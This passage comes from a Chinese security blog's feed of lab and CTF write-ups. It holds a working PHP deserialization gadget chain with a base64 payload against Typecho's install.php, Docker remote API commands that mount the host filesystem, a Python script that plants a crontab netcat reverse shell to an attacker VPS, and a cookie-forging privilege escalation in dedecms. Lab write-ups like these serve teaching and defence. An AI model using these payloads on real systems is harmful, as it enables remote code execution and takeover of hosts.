&lt;p&gt;而&lt;code&gt;$this-&amp;gt;_items&lt;/code&gt;是&lt;code&gt;Typecho_Feed&lt;/code&gt;类中的一个属性，可以被我们所控制。&lt;/p&gt;
&lt;h2 id=&#34;34-requestphp-文件&#34;&gt;3.4 Request.php 文件&lt;/h2&gt;
&lt;p&gt;之前我们说过，程序会访问&lt;code&gt;$item[&#39;author&#39;]&lt;/code&gt;中的&lt;code&gt;screenName&lt;/code&gt;对象。而如果我们从外部想获取一个类中的私有属性，或者调用一个在类中不存在的对象时，会触发类中的&lt;code&gt;__get&lt;/code&gt;魔术方法。&lt;/p&gt;
&lt;p&gt;如下图所示，调用了自己的&lt;code&gt;get&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222033.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么它自己的&lt;code&gt;get&lt;/code&gt;方法是做什么的呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222647.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们传入key值，也就是&lt;code&gt;screenName&lt;/code&gt;，然后去找&lt;code&gt;$this-&amp;gt;_params&lt;/code&gt;中的元素，形成&lt;code&gt;$value&lt;/code&gt;变量。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;$this-&amp;gt;_params&lt;/code&gt;是&lt;code&gt;Typecho_Request&lt;/code&gt;类中的一个属性，可以被我们所控制。&lt;/p&gt;
&lt;p&gt;然后&lt;code&gt;$value&lt;/code&gt;变量会进入&lt;code&gt;_applyFilter&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710222918.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这里我们看到，&lt;code&gt;$value&lt;/code&gt;会进入两个函数分别是&lt;code&gt;array_map&lt;/code&gt;和&lt;code&gt;call_user_func&lt;/code&gt;，&lt;code&gt;$value&lt;/code&gt;变量可以被我们控制。&lt;/p&gt;
&lt;p&gt;其次，&lt;code&gt;$filter&lt;/code&gt;变量是&lt;code&gt;$this-&amp;gt;_filter&lt;/code&gt;中的元素，&lt;code&gt;$this-&amp;gt;_filter&lt;/code&gt;是当前&lt;code&gt;Typecho_Request&lt;/code&gt;类中的属性，也可以被我们控制。&lt;/p&gt;
&lt;p&gt;因此&lt;code&gt;array_map()&lt;/code&gt;和&lt;code&gt;call_user_func()&lt;/code&gt;的两个参数都可控，我们可以在前面的参数内传入&lt;code&gt;system&lt;/code&gt;，在后面的参数内传入指令，便可以&lt;code&gt;getshell&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;4-漏洞利用&#34;&gt;4. 漏洞利用&lt;/h1&gt;
&lt;h2 id=&#34;41-梳理利用流程&#34;&gt;4.1 梳理利用流程&lt;/h2&gt;
&lt;p&gt;接下来我们梳理一下利用流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在&lt;code&gt;install.php&lt;/code&gt;中，传入我们构造的&lt;code&gt;cookie&lt;/code&gt;值触发反序列化，实例化对象的时候，传入&lt;code&gt;Typecho_Db&lt;/code&gt;类。&lt;/li&gt;
&lt;li&gt;然后在&lt;code&gt;Typecho_Db&lt;/code&gt;类中进行字符串拼接，触发&lt;code&gt;__toString()&lt;/code&gt;魔术方法。&lt;/li&gt;
&lt;li&gt;然后在含有&lt;code&gt;__toString()&lt;/code&gt;魔术方法的在&lt;code&gt;Typecho_Feed&lt;/code&gt;类中，获取私有属性，触发&lt;code&gt;__get()&lt;/code&gt;魔术方法。&lt;/li&gt;
&lt;li&gt;然后在含有&lt;code&gt;__get()&lt;/code&gt;魔术方法的&lt;code&gt;Typecho_Request&lt;/code&gt;类中，调用&lt;code&gt;_applyFilter()&lt;/code&gt;方法。&lt;/li&gt;
&lt;li&gt;然后在&lt;code&gt;_applyFilter()&lt;/code&gt;方法中，触发&lt;code&gt;array_map()&lt;/code&gt;和&lt;code&gt;call_user_func()&lt;/code&gt;这两个参数可控的危险函数。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;42-构造poc&#34;&gt;4.2 构造POC&lt;/h2&gt;
&lt;p&gt;然后便可以构造如下&lt;code&gt;poc&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Typecho_Request&lt;/span&gt;{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $_params &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;();

	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
		$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_params&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;screenName&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exp&amp;#34;&lt;/span&gt;);
		$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_filter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;);
	}
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Typecho_Feed&lt;/span&gt;{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $_items &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $_type;

	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
		$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_items&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(
			&lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(
				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;author&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Typecho_Request&lt;/span&gt;(),
				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;link&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;link&amp;#34;&lt;/span&gt;,
				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;,
				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;date&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;date&amp;#34;&lt;/span&gt;,
				&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;category&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Typecho_Request&lt;/span&gt;()),   &lt;span style=&#34;color:#75715e&#34;&gt;#注意点
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			)
		);
		$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSS 2.0&amp;#34;&lt;/span&gt;;
	}
}

$config &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;adapter&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Typecho_Feed&lt;/span&gt;());
&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;(($config)))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;43-注意事项&#34;&gt;4.3 注意事项&lt;/h2&gt;
&lt;p&gt;需要注意的是：&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;install.php&lt;/code&gt;文件中，有对&lt;code&gt;GET&lt;/code&gt;请求的参数做要求，&lt;strong&gt;必须为&lt;code&gt;finish&lt;/code&gt;&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710224502.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;以及对请求头中&lt;code&gt;referer&lt;/code&gt;的来源做要求，&lt;strong&gt;必须为当前站点&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710224858.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们将上述&lt;code&gt;POC&lt;/code&gt;生成的字符串，经过&lt;code&gt;base64&lt;/code&gt;加密后，赋值给&lt;code&gt;__typecho_config&lt;/code&gt;发送&lt;code&gt;post&lt;/code&gt;请求：&lt;/p&gt;
&lt;p&gt;生成字符串如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToiY2F0IC9mbGFnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX1zOjQ6ImxpbmsiO3M6NDoibGluayI7czo1OiJ0aXRsZSI7czo1OiJ0aXRsZSI7czo0OiJkYXRlIjtzOjQ6ImRhdGUiO3M6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OToiY2F0IC9mbGFnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发送请求：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710225614.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;code&gt;flag&lt;/code&gt;，当然在这之前构造了很多&lt;code&gt;payload&lt;/code&gt;用来查询&lt;code&gt;flag&lt;/code&gt;在哪里。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200710225840.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{flag_1s_here}&lt;/p&gt;
&lt;/blockquote&gt;
- https://b40du.github.io/posts/writeup-chaitin-deserialization-01/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>Docker Daemon Api 未授权访问漏洞复现</title>
        <link>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</link>
        <pubDate>Wed, 08 Jul 2020 23:55:11 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/reproduce-web-docker-daemon-api/ -&lt;h1 id=&#34;1-漏洞描述&#34;&gt;1. 漏洞描述&lt;/h1&gt;
&lt;p&gt;Docker是一种开源的应用容器引擎，由于权限设置不当以及端口暴露在外网等原因，可以利用该漏洞访问Docker对外开放的一个API接口，进行远程命令执行。&lt;/p&gt;
&lt;h1 id=&#34;2-漏洞成因&#34;&gt;2. 漏洞成因&lt;/h1&gt;
&lt;p&gt;Docker在使用集群管理（如：Kubernetes，swarm）时，要使用&lt;code&gt;remote api&lt;/code&gt;对节点进行管理，&lt;code&gt;remote api&lt;/code&gt;无认证时的默认端口是2375（需要TLS认证默认登录是2376）。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;remote api&lt;/code&gt;默认是可以不需要认证能直接访问，能直接对Docker进行操作，如新建容器，删除容器，查看镜像容器信息等等。&lt;/p&gt;
&lt;h1 id=&#34;3-漏洞复现&#34;&gt;3. 漏洞复现&lt;/h1&gt;
&lt;h2 id=&#34;31-进入vulhub漏洞目录启动漏洞环境&#34;&gt;3.1 进入vulhub漏洞目录，启动漏洞环境&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200711190924.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200711191010.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;32-探测2375端口&#34;&gt;3.2 探测2375端口&lt;/h2&gt;
&lt;p&gt;如果是公网的其他主机，我们需要探测2375端口。&lt;/p&gt;
&lt;p&gt;由于是靶场搭建漏洞环境，在这里我们直接访问&lt;code&gt;http://youer-vps-ip:2375/version&lt;/code&gt;请求，如果返回包带有&lt;code&gt;json&lt;/code&gt;格式，说明存在该漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708144642.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;33-利用漏洞查看镜像创造容器&#34;&gt;3.3 利用漏洞查看镜像、创造容器&lt;/h2&gt;
&lt;p&gt;在远程&lt;code&gt;vps&lt;/code&gt;中，构造如下&lt;code&gt;poc&lt;/code&gt;，进行测试：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 images
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195346.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们新建一个容器，并将&lt;code&gt;entrypoint&lt;/code&gt;设置为&lt;code&gt;/bin/bash&lt;/code&gt;或者&lt;code&gt;/bin/sh&lt;/code&gt;，挂载点设置为服务器的根目录挂载至&lt;code&gt;/tmp&lt;/code&gt;目录下，然后使用&lt;code&gt;ls&lt;/code&gt;命令查看。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195528.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后使用命令查看所有的容器。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker -H&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tcp://your-vps-ip:2375 ps -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708195642.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;34-利用漏洞反弹shell&#34;&gt;3.4 利用漏洞反弹shell&lt;/h2&gt;
&lt;p&gt;我们启动一个容器，并将宿主机的&lt;code&gt;/etc&lt;/code&gt;目录挂载到容器中，这个时候我们便已经可以任意读写文件了。接下来我们需要做的就是将命令写入&lt;code&gt;crontab&lt;/code&gt;配置文件，进行反弹&lt;code&gt;shell&lt;/code&gt;。于是在自己的&lt;code&gt;vps&lt;/code&gt;上构造如下&lt;code&gt;poc&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; docker

client &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; docker&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DockerClient(base_url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://靶场ip:2375/&amp;#39;&lt;/span&gt;)
data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;containers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;alpine:latest&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;sh -c &amp;#34;echo &amp;#39;*/1 * * * * /usr/bin/nc your-vps-ip 7890 -e /bin/sh&amp;#39; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;#34; &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;True, volumes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/etc&amp;#39;&lt;/span&gt;: {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bind&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/tmp/etc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mode&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rw&amp;#39;&lt;/span&gt;}})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后同时另外开启一个控制台，使用&lt;code&gt;nc&lt;/code&gt;监听&lt;code&gt;7890&lt;/code&gt;端口：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;nc -nvvl &lt;span style=&#34;color:#ae81ff&#34;&gt;7890&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200245.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后运行&lt;code&gt;python&lt;/code&gt;脚本，监听到靶场ip连接：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200432.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后输入命令&lt;code&gt;id&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708200558.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在这里有个问题就是，poc并不是一成不变的，要根据实际情况进行调整，有的时候是bash有的时候是sh。&lt;/p&gt;
&lt;p&gt;另外就是，跟阿杜老师交流的过程中进行了多次复现，又遇到了复现不成功的情况，经过和阿杜老师的交流，发现环境可能有些问题，计划任务不一定可以正常执行，需要先crontab -e 编辑一下，保存退出，然后计划任务就可以被激活。&lt;/p&gt;
&lt;p&gt;由于这部分内容尚未深入研究，待有时间对其再次做一些测试。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;4-漏洞危害&#34;&gt;4. 漏洞危害&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可利用此漏洞，远程命令执行，且很可能逃逸至宿主机&lt;/li&gt;
&lt;li&gt;可利用此漏洞，进行&lt;code&gt;crontabs&lt;/code&gt;反弹&lt;code&gt;shell&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-漏洞修复&#34;&gt;5. 漏洞修复&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;增加TLS认证（比较复杂）&lt;/li&gt;
&lt;li&gt;在防火墙上配置禁止外网访问&lt;code&gt;2375&lt;/code&gt;端口&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-参考资料&#34;&gt;6. 参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Docker Daemon Api 未授权访问漏洞&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/43d86d7ed3a5&#34;&gt;https://www.jianshu.com/p/43d86d7ed3a5&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Docker Remote API 未授权访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[https://mature-sec.com/post/docker-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/](&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
- https://b40du.github.io/posts/reproduce-web-docker-daemon-api/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>Writeup 之 业务逻辑 魔改flag版</title>
        <link>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</link>
        <pubDate>Tue, 07 Jul 2020 23:35:20 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-business_logic-01/ -&lt;p&gt;由于靶场被频繁扫描，断连率颇高，&lt;code&gt;dedecms&lt;/code&gt;使用本地搭建进行测试。&lt;/p&gt;
&lt;h1 id=&#34;1-越权dedecms&#34;&gt;1. 越权dedecms&lt;/h1&gt;
&lt;p&gt;首先进入靶场首页，是个经典的&lt;code&gt;dedecms&lt;/code&gt;建站系统。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707220858.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-注册用户&#34;&gt;1. 注册用户&lt;/h2&gt;
&lt;p&gt;首先我们注册一个普通用户，用户名：&lt;code&gt;00001&lt;/code&gt;，密码：&lt;code&gt;00001&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708031803.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功注册。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708031837.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-越权到admin&#34;&gt;2. 越权到admin&lt;/h2&gt;
&lt;p&gt;如下图所示，已经进入到&lt;code&gt;00001&lt;/code&gt;账户。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708033346.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后访问个人主页。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708033236.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们查看当前的&lt;code&gt;cookie&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708033447.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们将&lt;code&gt;DedeUserID&lt;/code&gt;改成自己的账户名&lt;code&gt;00001&lt;/code&gt;，将&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;改成&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708033859.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改完成后，访问个人主页，已经变成了&lt;code&gt;admin&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200708033940.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个时候，我们已经实现越权，登录到了&lt;code&gt;admin&lt;/code&gt;账户的前台。接下来，我们尝试修改前台密码。&lt;/p&gt;
&lt;h2 id=&#34;3-修改admin前台密码&#34;&gt;3. 修改admin前台密码&lt;/h2&gt;
